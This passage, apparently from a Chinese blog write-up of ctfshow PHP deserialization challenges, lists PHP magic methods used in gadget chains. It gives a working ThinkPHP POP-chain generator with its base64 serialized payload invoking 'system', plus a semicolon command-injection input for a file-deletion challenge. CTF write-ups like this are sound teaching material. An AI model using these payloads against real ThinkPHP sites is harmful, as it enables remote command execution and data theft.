+<p>__destruct 一定会调用</p>
+<p>__toString 当一个对象被反序列化后又被当做字符串使用</p>
+<p><strong>反序列化的常见中间跳板:</strong></p>
+<p>__toString 当一个对象被当做字符串使用</p>
+<p>__get 读取不可访问或不存在属性时被调用</p>
+<p>__set 当给不可访问或不存在属性赋值时被调用</p>
+<p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p>
+<p>形如 this-&gt;func();</p>
+<p><strong>反序列化的常见终点:</strong></p>
+<p>__call 调用不可访问或不存在的方法时被调用</p>
+<p>call_user_func 一般php代码执行都会选择这里</p>
+<p>call_user_func_array 一般php代码执行都会选择这里</p>
+<p>现在又多了<strong>phar反序列化的利用方式</strong>，能够反序列化其metadata部分，利用的范围增加了许多！</p>
+<p>使用上文的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">class Request&#123;</span><br><span class="line">    protected $hook = [];</span><br><span class="line">    protected $filter = &quot;system&quot;;</span><br><span class="line">    protected $config;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter = &quot;system&quot;;</span><br><span class="line">        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;ta3shi&#x27;];</span><br><span class="line">        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    private $data = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        # append键必须存在，并且与$this-&gt;data相同</span><br><span class="line">        $this-&gt;append = [&quot;ta3shi&quot;=&gt;[]];</span><br><span class="line">        $this-&gt;data = [&quot;ta3shi&quot;=&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files=[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//var_dump(new Windows());</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br><span class="line"></span><br><span class="line">// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo2OiJjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0&amp;ta3shi[]=cat /flag</code></p>
+<h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class filter&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $filecontent;</span><br><span class="line">    public $evilfile=false;</span><br><span class="line"></span><br><span class="line">    public function __construct($f,$fn)&#123;</span><br><span class="line">        $this-&gt;filename=$f;</span><br><span class="line">        $this-&gt;filecontent=$fn;</span><br><span class="line">    &#125;</span><br><span class="line">    public function checkevil()&#123;</span><br><span class="line">        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;evilfile)&#123;</span><br><span class="line">            system(&#x27;rm &#x27;.$this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;fn&#x27;]))&#123;</span><br><span class="line">    $content = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $f = new filter($_GET[&#x27;fn&#x27;],$content);</span><br><span class="line">    if($f-&gt;checkevil()===false)&#123;</span><br><span class="line">        file_put_contents($_GET[&#x27;fn&#x27;], $content);</span><br><span class="line">        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);</span><br><span class="line">        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);</span><br><span class="line">        echo &#x27;work done&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;where is flag?&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>_destruct</code>函数中执行system，fn含有php，使用分号隔开就可以执行命令了</p>
+<p><code>fn=php;cat f*|base64</code></p>
+<h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web255-256"><span class="toc-number">1.</span> <span class="toc-text">web255&amp;256</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-257"><span class="toc-number">2.</span> <span class="toc-text">web 257</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web258"><span class="toc-number">3.</span> <span class="toc-text">web258</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web259"><span class="toc-number">4.</span> <span class="toc-text">web259</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web261"><span class="toc-number">5.</span> <span class="toc-text">web261</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web262"><span class="toc-number">6.</span> <span class="toc-text">web262</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web263"><span class="toc-number">7.</span> <span class="toc-text">web263</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web264"><span class="toc-number">8.</span> <span class="toc-text">web264</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web265"><span class="toc-number">9.</span> <span class="toc-text">web265</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">9.0.1.</span> <span class="toc-text">引用绕过的基本原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web266"><span class="toc-number">10.</span> <span class="toc-text">web266</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web267"><span class="toc-number">11.</span> <span class="toc-text">web267</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web268"><span class="toc-number">12.</span> <span class="toc-text">web268</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-269-270"><span class="toc-number">13.</span> <span class="toc-text">web 269 270</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web271"><span class="toc-number">14.</span> <span class="toc-text">web271</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web272-273"><span class="toc-number">15.</span> <span class="toc-text">web272,273</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web274"><span class="toc-number">16.</span> <span class="toc-text">web274</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web275"><span class="toc-number">17.</span> <span class="toc-text">web275</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web276"><span class="toc-number">18.</span> <span class="toc-text">web276</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&text=ctfshow web反序列化学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&is_video=false&description=ctfshow web反序列化学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow web反序列化学习&body=Check out this article: https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&name=ctfshow web反序列化学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&t=ctfshow web反序列化学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    ta3shi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
